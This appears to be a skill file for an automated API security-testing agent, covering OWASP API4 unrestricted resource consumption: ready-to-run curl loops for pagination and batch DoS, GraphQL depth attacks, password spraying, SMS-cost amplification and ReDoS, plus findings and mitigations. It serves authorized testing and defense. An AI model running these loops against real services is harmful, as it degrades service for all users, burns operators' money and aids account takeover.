---
name: api_resource_consumption
description: API4 Unrestricted Resource Consumption — pagination DoS, batch abuse, query complexity, missing rate limits, costly operations
---

# API Unrestricted Resource Consumption

OWASP API Top 10 — **API4:2023**. Endpoints that respond to expensive requests without bounds. Distinct from authentication bypass: the auth is fine, the *cost* of the request is the problem. A logged-in customer can exhaust the API for everyone.

## Attack surface

| Resource | Cost vector |
|---|---|
| **Database CPU** | Unbounded pagination (`?limit=1000000`), missing index hints, nested OR queries, full-text search without rate limits |
| **Memory** | Large response builders, JSON-serializing huge result sets, file generation in-memory (PDF / ZIP exports) |
| **CPU** | Slow regex (`/admin/search?q=(a+)+x`), slow crypto (PBKDF2/bcrypt iterations on attacker-supplied work-factor), unbounded recursion in tree traversal |
| **Network bandwidth** | Large file generation, video transcoding, image resizing |
| **Third-party API quotas** | Each request triggers an upstream call (Twilio SMS, AWS SES email, Stripe API) — attacker drains your monthly quota |
| **Money** | Pay-per-request: SES email, Twilio SMS, OpenAI tokens, Stripe lookup. Each abuse request directly costs the operator |
| **Disk** | Unbounded file uploads, log spam, audit-row generation |

## Reconnaissance

### Discover unbounded pagination

```bash
# Try ridiculous limits:
curl -s -H "$AUTH" "https://api.target/users?limit=10000"
curl -s -H "$AUTH" "https://api.target/users?limit=-1"
curl -s -H "$AUTH" "https://api.target/users?per_page=99999"
curl -s -H "$AUTH" "https://api.target/users?pageSize=2147483647"

# Different param names by framework:
# Rails: page, per_page
# Django REST: page, page_size
# Spring: page, size
# Sequelize / Express: limit, offset
# GraphQL: first, last, after, before
```

If the response includes ALL users in a single payload, no upper bound is enforced. Server-side time should grow linearly — measure response time at limits 10, 100, 1000, 10000.

### Discover batch abuse

```bash
# JSON arrays as batch:
curl -X POST -H "$AUTH" -d '[{"op":"foo"},{"op":"foo"},...]' \
  https://api.target/batch

# GraphQL aliasing — N queries in one request:
{ a:user(id:1){...} b:user(id:2){...} c:user(id:3){...} ... z:user(id:26){...} }

# JSON-RPC batch:
[{"method":"x","id":1},{"method":"x","id":2},...]
```

Request 100 ops in one payload; if the server processes all 100, batch isn't rate-limited per-operation. Combine with credential testing (login attempts) for password spray DoS-amplification.

### Discover GraphQL query complexity

```graphql
# Depth attack — nested same-type query:
{ me { friends { friends { friends { friends { friends { id } } } } } } }

# Width attack — many sibling fields with sub-selects:
{ me {
    f1: posts { comments { author { posts { ... } } } }
    f2: posts { comments { author { posts { ... } } } }
    ... f50: ...
} }
```

Either of these constructs O(N^k) work for a single request. Measure response time per added depth/width level — linear-or-better is fine; super-linear means no complexity limit.

### Discover unrate-limited endpoints

For each candidate endpoint:

```bash
# 100 rapid requests:
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code} " -H "$AUTH" \
    "https://api.target/api/users/$i" &
done
wait
```

Look for: 429 / 503 missing entirely; X-RateLimit-* headers absent; consistent 200s on all 100. Run during low-traffic hours; respect any `--rate-limit` configured by the operator.

### Discover slow endpoints

```bash
# Time each endpoint discovered by bfs_crawl:
for url in $(jq -r '.endpoints[].url' < crawl_map.json); do
  time curl -s -H "$AUTH" "$url" > /dev/null
done | sort -k2 -n -r
```

The top 5 slowest endpoints are your target list — the agent escalates pagination / batching / complexity attacks against them.

### Endpoints that hit money-cost upstream APIs

Look for paths suggesting external integrations:
- `/api/sms/send`, `/api/notifications/email`, `/api/auth/forgot-password`, `/api/auth/resend`
- `/api/lookup/phone`, `/api/lookup/address` (Twilio Lookup, USPS API)
- `/api/ai/*`, `/api/embed`, `/api/summarize` (LLM upstream)
- `/api/payments/lookup-customer` (Stripe API per-call cost)

These are highest-priority — each abuse request burns operator money directly.

## Exploitation patterns

### 1. Pagination DoS

```bash
curl -H "$AUTH" "https://api.target/orders?limit=10000000"
# If 200 with massive body: confirmed.
# If 200 but server died mid-stream: also confirmed (server crash).
# If 200 with capped result: limit enforced — check what cap is.
```

Quantify the cost: response time × concurrent attackers × frequency = service degradation.

### 2. Authentication endpoints lacking lockout

```bash
# Password spray without rate limit:
for i in $(seq 1 100); do
  curl -s -X POST -d '{"user":"alice","pass":"wrong'$i'"}' \
    https://api.target/auth/login
done
```

A 401 on every attempt with no progressive delay = no lockout. Combined with weak password policy → real account takeover risk.

### 3. Money-cost amplification

```bash
# Trigger 100 SMS sends to attacker-controlled number:
for i in $(seq 1 100); do
  curl -X POST -H "$AUTH" -d '{"phone":"+15551234567"}' \
    https://api.target/auth/send-otp
done
```

If the operator pays Twilio $0.01/SMS, that's $1 per 100 requests. Sustained abuse: $24/day per attacker per amplified endpoint. Worth flagging even when dollar-cost is small — at scale it's denial-of-wallet.

### 4. Slow regex

```bash
# Endpoint accepts user-supplied search:
curl -G -H "$AUTH" "https://api.target/admin/search" \
  --data-urlencode "q=$(python -c 'print("a"*30 + "!")')"
# If the regex is /^(a+)+$/ in JS or similar, response time spikes
# super-linearly.
```

## Verification

Quantify:
- **Response time at the boundary** (limit=10 baseline; limit=10000 boundary). 100x increase = real.
- **Request cost in resources** (CPU%, RAM, downstream API calls) — coordinate with the operator if testing prod.
- **Request cost in money** — explicit dollar number when calculable (Twilio rate × abuse rate).

False-positive guard: many APIs respond fast at high limits because the data set is small. The vuln is the *unbounded* nature, not the current cost — but findings need a real cost demonstration to be actionable.

## Findings to emit

- **High** (CWE-770, allocation_of_resources_without_limits) — pagination / batch / query-complexity DoS confirmed by super-linear response time
- **High** (CWE-307, missing_rate_limit) — auth endpoint accepts >50 attempts without lockout
- **High** (CWE-405, asymmetric_resource_consumption) — money-cost amplification: each request triggers an upstream API call without per-account bound
- **Medium** (CWE-770) — endpoint accepts >1000 items per request without bound; cost manageable but unprotected
- **Low** — endpoint has no documented rate limit headers; rate-limit may be enforced upstream but not visibly

`verification_status="needs_review"` unless the cost vector was quantified end-to-end.

## Mitigation guidance

- Server-side enforce a hard maximum on all pagination params (e.g. `min(limit, 100)`)
- Apply per-account + per-IP rate limits at the gateway, not just at the application layer
- For batch operations: cap batch size, charge per-operation against the rate-limit budget
- For GraphQL: install a query-cost analyzer (graphql-cost-analysis), reject queries above a complexity threshold
- For money-cost endpoints: per-account per-day cap before forwarding to upstream API
- Add response-time SLOs and alert on regression — pagination DoS escalates from "slow" to "down" fast

## Related skills

- `race_conditions` — concurrent abuse where ordering matters (TOCTOU); distinct from cost-based DoS
- `business_logic` — for "abuse a feature without breaking auth"
- `authentication_jwt` — auth-specific rate limiting (login lockout, password reset throttling)
